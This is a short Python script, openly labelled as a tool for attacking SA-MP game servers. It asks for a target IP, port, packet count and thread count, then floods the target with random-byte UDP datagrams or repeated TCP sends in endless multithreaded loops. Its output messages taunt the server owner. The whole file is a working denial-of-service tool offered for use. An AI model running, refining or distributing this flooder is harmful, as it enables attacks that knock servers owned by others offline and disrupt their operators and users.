#!/usr/bin/env python3
#Code by Rizal
import random
import socket
import threading

print("~~~ TOOLS BY ZIEL FOR ATTACKING SAMP SERVER ~~~")
print("~~~ Scripting By Ziel ~~~")
print("~~~ Script For My Friends ~~~")
ip = str(input(" IP TARGET :"))
port = int(input(" PORT TARGET :"))
choice = str(input(" SIAP BIKIN PONDER KETAR KETIR (y/n) :"))
times = int(input(" PACKETS :"))
threads = int(input(" THREADS :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[ZIEL!!]","[Z]","[ZIEL!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ZIEL ATTACKING TO YOUR SERVER")
		except:
			print("[!] UDAH AH CAPEQS")

def run2():
	data = random._urandom(16)
	i = random.choice(("[ZIEL!!]","[Z]","[ZIEL!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ZIEL ATTACKING TO YOUR SERVER")
		except:
			s.close()
			print("[*] UDAH AH MALES NANTI NANGIS")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
